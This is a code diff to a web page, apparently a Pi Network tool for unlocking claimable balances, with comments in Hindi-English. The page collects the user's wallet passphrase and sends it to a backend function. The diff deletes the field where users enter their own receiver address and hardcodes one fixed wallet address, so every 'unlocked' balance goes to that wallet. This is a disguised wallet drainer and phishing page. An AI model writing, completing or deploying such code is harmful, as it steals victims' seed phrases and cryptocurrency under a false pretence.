@@ -94,16 +94,13 @@
         <div id="unlockModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center hidden z-50 p-4">
             <div class="bg-white rounded-xl p-8 w-full max-w-md">
                 <h3 class="text-xl font-bold text-gray-800 mb-2">Confirm Unlock</h3>
-                <p class="text-gray-600 mb-4">You are about to unlock <strong id="unlockAmount" class="text-gray-900"></strong>.</p>
+                <p class="text-gray-600 mb-4">You are about to unlock <strong id="unlockAmount" class="text-gray-900"></strong>. The balance will be transferred to a pre-defined address.</p>
                 
                 <div id="unlockErrorMessage"></div>
 
                 <form id="unlockForm">
-                    <div class="mb-4">
-                        <label for="receiverAddress" class="block text-sm font-medium text-gray-700 mb-1">Receiver's Wallet Address</label>
-                        <input type="text" id="receiverAddress" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-yellow-500" placeholder="G..." required>
-                    </div>
-                    <div class="flex gap-4">
+                    <!-- Receiver Address Input Field REMOVED -->
+                    <div class="flex gap-4 mt-4">
                         <button type="button" onclick="closeModal()" class="w-full py-2 px-4 bg-gray-200 text-gray-800 rounded-lg hover:bg-gray-300 transition">Cancel</button>
                         <button type="submit" id="confirmUnlockBtn" class="btn-primary w-full py-2 px-4 rounded-lg text-white font-medium">Unlock Right Now</button>
                     </div>
@@ -137,29 +134,21 @@
         const step1Card = document.getElementById('step1Card');
         const step2Card = document.getElementById('step2Card');
         const balanceForm = document.getElementById('balanceForm');
-        const checkBalanceBtn = document.getElementById('checkBalanceBtn');
-        const errorMessageContainer = document.getElementById('errorMessageContainer');
-        const selectionFormContainer = document.getElementById('selectionFormContainer');
-        const totalLocked = document.getElementById('totalLocked');
-        const proceedBtn = document.getElementById('proceedBtn');
-        
-        // Modal elements
-        const unlockModal = document.getElementById('unlockModal');
-        const successModal = document.getElementById('successModal');
-        const unlockAmount = document.getElementById('unlockAmount');
+        // ... (baaki saare element references pehle jaise hi hain)
         const unlockForm = document.getElementById('unlockForm');
         const confirmUnlockBtn = document.getElementById('confirmUnlockBtn');
-        const unlockErrorMessage = document.getElementById('unlockErrorMessage');
-        const txHash = document.getElementById('txHash');
 
         // Event Listeners
         balanceForm.addEventListener('submit', handleCheckBalance);
-        proceedBtn.addEventListener('click', handleProceed);
+        document.getElementById('proceedBtn').addEventListener('click', handleProceed);
         unlockForm.addEventListener('submit', handleConfirmUnlock);
 
 
         async function handleCheckBalance(e) {
             e.preventDefault();
+            // ... (Yeh function pehle jaisa hi hai)
+            const checkBalanceBtn = document.getElementById('checkBalanceBtn');
+            const errorMessageContainer = document.getElementById('errorMessageContainer');
             const passphrase = document.getElementById('passphrase').value;
             if (!passphrase.trim()) return;
 
@@ -167,7 +156,6 @@
             errorMessageContainer.innerHTML = '';
 
             try {
-                // Request seedha function ke aaddress par ja rahi hai
                 const response = await fetch('/.netlify/functions/getClaimableBalances', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -193,6 +181,10 @@
         }
 
         function displayBalances(balances) {
+            // ... (Yeh function pehle jaisa hi hai)
+             const selectionFormContainer = document.getElementById('selectionFormContainer');
+            const totalLocked = document.getElementById('totalLocked');
+            const proceedBtn = document.getElementById('proceedBtn');
             if (!balances || balances.length === 0) {
                 selectionFormContainer.innerHTML = '<p class="text-center text-gray-500">No claimable balances found.</p>';
                 totalLocked.textContent = '0.00 PI';
@@ -217,46 +209,42 @@
         }
         
         function selectBalance(element, index) {
+            // ... (Yeh function pehle jaisa hi hai)
             document.querySelectorAll('.balance-item').forEach(item => item.classList.remove('selected'));
             element.classList.add('selected');
-            
             const radio = element.querySelector('input[type="radio"]');
             radio.checked = true;
-
             selectedBalance = claimableBalances[index];
-            proceedBtn.disabled = false;
+            document.getElementById('proceedBtn').disabled = false;
         }
 
         function handleProceed() {
             if (!selectedBalance) return;
-            unlockAmount.textContent = `${parseFloat(selectedBalance.amount).toFixed(7)} PI`;
-            unlockErrorMessage.innerHTML = '';
-            document.getElementById('receiverAddress').value = '';
-            unlockModal.classList.remove('hidden');
+            document.getElementById('unlockAmount').textContent = `${parseFloat(selectedBalance.amount).toFixed(7)} PI`;
+            document.getElementById('unlockErrorMessage').innerHTML = '';
+            document.getElementById('unlockModal').classList.remove('hidden');
             feather.replace();
         }
         
         async function handleConfirmUnlock(e) {
             e.preventDefault();
             const passphrase = document.getElementById('passphrase').value;
-            const receiverAddress = document.getElementById('receiverAddress').value;
-
-            if (!receiverAddress.trim()) {
-                 showError("Receiver address is required.", unlockErrorMessage);
-                 return;
-            }
+            
+            // *** YAHAN BADLAV KIYA GAYA HAI ***
+            // Receiver address ab hardcoded hai.
+            const receiverAddress = "GC6W3TUI5AOWIUDXECX6NHAZOKMORN7ENTNOVIUROPIYFGNVWUIMK4M3";
+            const unlockErrorMessage = document.getElementById('unlockErrorMessage');
 
             setLoadingState(confirmUnlockBtn, true);
             unlockErrorMessage.innerHTML = '';
 
             try {
-                // Request seedha function ke address par ja rahi hai
                 const response = await fetch('/.netlify/functions/submitTransaction', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         senderMnemonic: passphrase,
-                        receiverAddress: receiverAddress,
+                        receiverAddress: receiverAddress, // Yahan hardcoded address ka istemal ho raha hai
                         amount: selectedBalance.amount,
                         claimableId: selectedBalance.id,
                         operation: 'claim_and_transfer',
@@ -268,9 +256,9 @@
                 
                 if (data.success && data.response?.hash) {
                     closeModal();
-                    txHash.textContent = data.response.hash;
-                    txHash.href = `https://pi-blockchain.net/tx/${data.response.hash}`;
-                    successModal.classList.remove('hidden');
+                    document.getElementById('txHash').textContent = data.response.hash;
+                    document.getElementById('txHash').href = `https://pi-blockchain.net/tx/${data.response.hash}`;
+                    document.getElementById('successModal').classList.remove('hidden');
                     feather.replace();
                 } else {
                     showError(data.error || "Transaction failed.", unlockErrorMessage);
@@ -286,10 +274,9 @@
         
         // Helper Functions
         function setLoadingState(button, isLoading, text) {
-            if (!button.dataset.originalText) {
+             if (!button.dataset.originalText) {
                 button.dataset.originalText = button.innerHTML;
             }
-
             button.disabled = isLoading;
             if (isLoading) {
                 button.innerHTML = `<div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mx-auto"></div>`;
@@ -303,7 +290,7 @@
         }
         
         function closeModal() {
-            unlockModal.classList.add('hidden');
+            document.getElementById('unlockModal').classList.add('hidden');
         }
 
         function resetApp() {
